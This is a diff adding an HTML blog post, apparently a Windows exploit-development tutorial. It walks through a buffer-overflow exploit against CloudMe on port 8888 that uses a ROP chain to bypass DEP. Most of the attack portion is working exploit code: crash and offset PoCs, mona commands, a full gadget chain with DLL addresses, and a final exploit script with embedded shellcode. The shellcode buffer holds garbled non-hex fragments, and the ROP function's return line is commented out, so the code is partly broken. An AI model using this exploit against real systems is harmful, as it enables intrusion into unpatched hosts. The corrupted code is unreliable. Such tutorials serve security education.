@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" href="css/style.css" />
+		<link rel="stylesheet" href="css/nivo-slider.css" type="text/css" media="screen" />
+		<link rel="stylesheet" href="css/default/default.css" type="text/css" media="screen" />
+    <link rel="stylesheet" href="styles/railscasts.css">
+<script src="highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
+		<script src="jquery.nivo.slider.pack.js" type="text/javascript"></script>
+        <!--[if lt IE 9]>
+        <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+        <title>NutCrackers Security</title>
+    </head>
+	<body id="blog">
+		<div id="wrapper">
+
+			<!--__--__--__--__--__--  L O G O  &   N A V    B A R --__--___--__--__--__-->
+			<header>
+				<div class="logo">
+                    <div class="Nut"><span class="N">N</span>ut<span class="C">C</span>rackers <span class="S">S</span>ecurity</div>
+                </div>
+                  <img src="imagini/shield.png" class="logo-Nut">
+				<nav>
+					<ul>
+            	<li><a href="index.html" id="homenav">About Me</a></li>
+						<li><a href="blog.html" id="blognav">Blog</a></li>
+						<li><a href="contact.html">Contact</a></li>
+              <li><a href=http://ninedos.proboards.com/>Forum</a></li>
+					</ul>
+				</nav>
+			</header>
+
+			<!--__--__--__--__--  M A I N   C O N T E N T  --__--__--__--___--__--__-->
+			<section>
+        <article id="singlepost">
+            <h1><a href="Windows6.html">Windows Exploit Development Part VI ROP </a></h1>
+            <h2>Posted By: <a href="#">T3jv1l</a> 28/2/2019 <a href="#"></a>.</h2>
+            <img src="imagini/ROP.jpg" alt="" style="height:275px;width:580px;" />
+            <p>Hello everyone. Today i will speek about <b>Windows Exploit Development Return Oriented Programming</b>. In this tutorial we try to exploit again the first software at this series.</p>
+            <p>This technique called Return Orient Programing(ROP) is used for bypassed Data Execution Protetion(DEP).What is DEP? DEP is a technique and a mechanism to avoid attacks such as attack Buffer Overflow , Heap Exploatation etc .. and it is possible to configure one
+of the four ways:</p>
+<p style="color:#27ea0e"><b>1) OptIn</b>: Enabling DEP protection for Windows programs and services essential.</p>
+<p style="color:#03f5ee"><b>2) OptOut</b>: Enables DEP protection for all programs and services, except those that are selected by the exception list.</p>
+<p style="color:#f5df03"><b>3) AlwaysOn</b>: Enables DEP protection for all programs and services without exceptions. "AlwaysOn" can not be disabled.</p>
+<p style="color:#9c5af0"><b>4) AlwaysOff</b>: Protect DEP for all (inactive programs / services).</p>
+<p>This technique uses Windows API to bypass this protection. These API's are:</p>
+<p><b>VirtualProtect ()</b> ----  This function will change the access and protection level
+of a certain memory page allowing signaling and location in the case
+where shellcode is executable.</p>
+<p><b>WriteProcessMemory</b> () ---- Allow to copy shellcode to memory location,
+to move the execution. The location will again place the shellcode where it should be
+writable / executable.</p>
+<p><b>NtSetInformationProcess ()</b> ---- It allows us to change DEP Policy protection
+for the current process  to be able to perform the final analysis of the shell code
+of Stack.</p>
+<p><b>SetProcessDEPPolicy ()</b> ---- This allows us to change DEP Policy protection
+for the current process  to be able to perform the final analysis of the shell code
+of Stack. (If you can see is similar with NtSetInformationProcess ()).</p>
+<p>I think that is enough with the explanations, you can find much more on the <b>Corelan Blog</b>. But keep in mind , at this exploit we will use ASLR enabled module!!!!!!</p>
+<p>Now let's enable DEP. Going to Control Panel > System and Security > System then clicking on Advanced system settings, click on Settings  and go to the Data Execution Prevention tab to select "Turn on DEP for all programs and services except those" and restart your VM to ensure DEP is turned on.</p>
+<p><img src="imagini/rop1.png" style="height:375px;width:280px;"></p>
+<p>Now is turn for create a POC for CloudMe software.</p>
+<p><pre><code>import socket
+
+
+
+
+target="127.0.0.1"
+junk="A"*4000
+
+
+
+payload=junk
+
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,8888))
+	s.send(payload)
+except:
+	print "Don't Crash Me !"</pre></code></p>
+  <p><img src="imagini/rop2.png"></p>
+  <p>Great we have EIP overwrite that is good!! Now we need to found offset.</p>
+  <p><pre><code>!mona pc 4000
+!mona po 316A4230 -- 1052 offset
+</pre></code></p>
+<p><pre><code>import socket
+
+
+
+
+target="127.0.0.1"
+buffer=4000
+junk1="A"*1052
+shellcode="\xCC"*200
+
+
+
+exploit=junk1+shellcode
+fill="\x43"* (buffer-len(exploit))
+payload=exploit+fill
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,8888))
+	s.send(payload)
+except:
+	print "Don't Crash Me !"</pre></code></p>
+    <p><img src="imagini/rop3.png"></p>
+    <p>Now is turn for ROP chain.So first, let’s establish what we need to put into what registers to get VirtualProtect() to complete successfully. We need to have:</p>
+    <p><b>1)lpAddress</b>: A pointer to an address that describes the starting page of the region of pages whose access protection attributes are to be changed.</p>
+    <p><b>2)dwSize</b>: The size of the region whose access protection attributes are to be changed, in bytes.</p>
+    <p><b>3)flNewProtect</b>: The memory protection option. This parameter can be one of the memory protection constants.</p>
+    <p><b>4)lpflOldProtect</b>: A pointer to a variable that receives the previous access protection value of the first page in the specified region of pages. If this parameter is NULL or does not point to a valid variable, the function fails.</p>
+    <p><pre><code>--------------------------------------------
+Register setup for VirtualProtect() :
+--------------------------------------------
+ EAX = NOP (0x90909090)
+ ECX = lpOldProtect (ptr to W address)
+ EDX = NewProtect (0x40)
+ EBX = dwSize
+ ESP = lPAddress (automatic)
+ EBP = ReturnTo (ptr to jmp esp)
+ ESI = ptr to VirtualProtect()
+ EDI = ROP NOP (RETN)
+--------------------------------------------</pre></code></p>
+    <p>To generate a list of usable gadgets from our chosen modules, you can use the following command in Mona:</p>
+    <p><pre><code> !mona rop -m Qt5Core.dll -cpb '\x00'</pre></code></p>
+    <p><pre><code># rop chain generated with mona.py - www.corelan.be
+0x61ba8b5e,  # POP EAX # RETN [Qt5Gui.dll]
+0x690398a8,  # ptr to &VirtualProtect() [IAT Qt5Core.dll]
+0x61bdd7f5,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Gui.dll]
+0x68aef542,  # XCHG EAX,ESI # RETN [Qt5Core.dll]
+0x68bfe66b,  # POP EBP # RETN [Qt5Core.dll]
+0x68f82223,  # & jmp esp [Qt5Core.dll]
+0x6d9f7736,  # POP EDX # RETN [Qt5Sql.dll]
+0xfffffdff,  # Value to negate, will become 0x00000201
+0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll]
+0x61e870e0,  # POP EBX # RETN [Qt5Gui.dll]
+0xffffffff,  #
+0x6204f463,  # INC EBX # RETN [Qt5Gui.dll]
+0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll]
+0x61ec44ae,  # POP EDX # RETN [Qt5Gui.dll]
+0xffffffc0,  # Value to negate, will become 0x00000040
+0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll]
+0x61e2a807,  # POP ECX # RETN [Qt5Gui.dll]
+0x6eb573c9,  # &Writable location [libgcc_s_dw2-1.dll]
+0x61e85d66,  # POP EDI # RETN [Qt5Gui.dll]
+0x6d9e431c,  # RETN (ROP NOP) [Qt5Sql.dll]
+0x61ba8ce5,  # POP EAX # RETN [Qt5Gui.dll]
+0x90909090,  # nop
+0x61b6b8d0,  # PUSHAD # RETN [Qt5Gui.dll]</pre></code></p>
+<p>Now is turn for a final POC.</p>
+<p><pre><code>import socket
+import struct
+
+def create_rop_chain():
+	# rop chain generated with mona.py - www.corelan.be
+        rop_gadgets = [
+		0x61ba8b5e,  # POP EAX # RETN [Qt5Gui.dll]
+		0x690398a8,  # ptr to &VirtualProtect() [IAT Qt5Core.dll]
+		0x61bdd7f5,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Gui.dll]
+		0x68aef542,  # XCHG EAX,ESI # RETN [Qt5Core.dll]
+		0x68bfe66b,  # POP EBP # RETN [Qt5Core.dll]
+		0x68f82223,  # & jmp esp [Qt5Core.dll]
+		0x6d9f7736,  # POP EDX # RETN [Qt5Sql.dll]
+		0xfffffdff,  # Value to negate, will become 0x00000201
+		0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll]
+		0x61e870e0,  # POP EBX # RETN [Qt5Gui.dll]
+		0xffffffff,  #
+		0x6204f463,  # INC EBX # RETN [Qt5Gui.dll]
+		0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll]
+		0x61ec44ae,  # POP EDX # RETN [Qt5Gui.dll]
+		0xffffffc0,  # Value to negate, will become 0x00000040
+		0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll]
+		0x61e2a807,  # POP ECX # RETN [Qt5Gui.dll]
+		0x6eb573c9,  # &Writable location [libgcc_s_dw2-1.dll]
+		0x61e85d66,  # POP EDI # RETN [Qt5Gui.dll]
+		0x6d9e431c,  # RETN (ROP NOP) [Qt5Sql.dll]
+		0x61ba8ce5,  # POP EAX # RETN [Qt5Gui.dll]
+		0x90909090,  # nop
+		0x61b6b8d0,  # PUSHAD # RETN [Qt5Gui.dll]
+  	]
+	#return ''.join(struct.pack('<'I', _) for _ in rop_gadgets)## add this here and remove one ''!!
+
+target="127.0.0.1"
+buffer=4000
+rop_chain = create_rop_chain()
+junk1="A"*1052
+nop="\x90"*24
+buf = ""
+buf +="\xba\xd5\x31\x08\x1FFRitFm5rP5oY5aeTeDikpQiWRz278L45\xc9\xb1"
+buf +="\x33\x83\xc3\x04\x31\x53\x0e\x03\x86\x3f\xea\xcd\xd4\xa8\x63"
+buf +="\x2d\x24\x29\x14\xa7\xc1\x18\x06\xd3\x82\x09\x96\x97\xc6\xa1"
+buf +="\x5d\xf5\xf2\x32\x13\xd2\xf5\xf3\x9e\x04\x38\x03\x2f\x89\x96"
+buf +="\xc7\x1FFRitFm5rLQihCFPSNPkwLNBTbVZHUAnYc5iRYaWz9em1\x81\x5a"
+buf +="\x12\x30\x36\xee\x66\x89\x37\x20\xed\xb1\x4f\x45\x31\x45\xfa"
+buf +="\x44\x61\xf6\x71\x0e\x99\x7c\xdd\xaf\x98\x51\x3d\x93\xd3\xde"
+buf +="\xf6\x67\xe2\x1FFRitFm5rLQihCFPSNPkwLNBTbVZHUAnYc5iRYaWz9emc"
+buf +="\x64\xa3\x0b\x1f\x1FFRitFm5rP5oY5aeTeDikpQiWRz278L45\xe2\x36"
+buf +="\xf5\x42\x74\xbc\xf9\x2f\xf2\x9a\x1d\xb1\xd7\x90\x19\x3a\xd6"
+buf +="\x76\xa8\x78\xfd\x52\xf1\xdb\x9c\xc3\x5f\x8d\xa1\x14\x07\x72"
+buf +="\x04\x5e\xa5\x67\x3e\x3d\xa3\x76\xb2\x3b\x8a\x79\xcc\x43\xbc"
+buf +="\x11\xfd\xc8\x53\x65\x02\x1b\x10\x99\x48\x06\x30\x32\x15\xd2"
+buf +="\x01\x5f\xa6\x08\x45\x66\x25\xb9\x35\x9d\x35\xc8\x30\xd9\xf1"
+buf +="\x20\x48\x72\x94\x46\xff\x73\xbd\x24\x9e\xe7\x5d\x85\x05\x80"
+buf +="\xc4\xd9"
+
+exploit=junk1+rop_chain+nop+buf
+fill="\x43"* (buffer-len(exploit))
+payload=exploit+fill
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,8888))
+	s.send(payload)
+except:
+	print "Don't Crash Me !"</pre></code></p>
+  <p>Short video with result at this exploit <b><a href="https://www.youtube.com/watch?v=8oQ4XJJukCY">#Windows Exploit Development ROP#</a></b></p>
+  <p>I hope you like this article about Windows Exploit Development and sorry for my bad English , i am not a native speaker (Happy Hack)</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+              <p><b>References!!</b></p>
+    <p><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/</a></p>
+    <p><a href="https://www.fuzzysecurity.com/tutorials/expDev/7.html">https://www.fuzzysecurity.com/tutorials/expDev/7.html</a></p>
+
+
+
+
+
+
+            </article>
+
+
+				<!--__--__--__--  S I D E B A R --__--__--__--__-->
+                <div id="sidebar">
+					<aside>
+						<div id="cat">
+              	<h1>Article</h1>
+              <ul>
+                <li><a href="Forensics.html">Volatility: Extract Password from RAM </a></l1>
+              <li><a href="Windows6.html">Windows Exploit Development Part VI ROP </a></li>
+                  <li><a href="Windows5.html">Windows Exploit Development Part V Unicode </a>
+                    <li><a href="Windows4.html">Windows Exploit Development Part IV EGG HUNTING </a>
+                <li><a href="Windows3.html">Windows Exploit Development Part III </a>
+                  <li><a href="Windows2.html">Windows Exploit Development Part II </a>
+                <li><a href="WED.html">Windows Exploit Development Part I </a>
+                  <li><a href="Shellcode1.html" style="font-weight: 700">Shellcode Part II </a>
+                <li><a href="Shellcode.html" style="font-weight: 700">Shellcode Part I </a>
+                <li><a href="Nmap.html" style="font-weight: 700">Nmap Firewall Scan</a>
+              <li><a href="Ubuntu.html" style="font-weight: 700">The Linux commands you should NEVER use</a>
+
+
+              </ul>
+							</ul>
+						</div>
+          </aside>
+                    					<aside>
+						<h1>Recent Posts</h1>
+						<ul>
+              <li><a href="Martie.html">March 2019 (1)</a></li>
+              <li><a href="February2019.html">February 2019 (2)</a></li>
+            <li><a href="January2019.html">January 2019 (4)</a></li>
+                <li><a href="Decembrie.html">December 2018 (1)</a></li>
+                	<li><a href="January.html">January 2018 (3)</a></li>
+						</ul>
+					</aside>
+				</div>
+			</section>
+			<!--__--__--__--__--  T H E    F O O T E R --__--__--__--___--__--__--__-->
+			<footer>
+				<p id="paragraf">Copyright &copy 2018 <span class="T3jv1l">T3jv1l</span>. All Rights Reserved. Created and design by <span class="Cruzer">CodexOnePro</span></p>
+			</footer>
+	</body>
+</html>
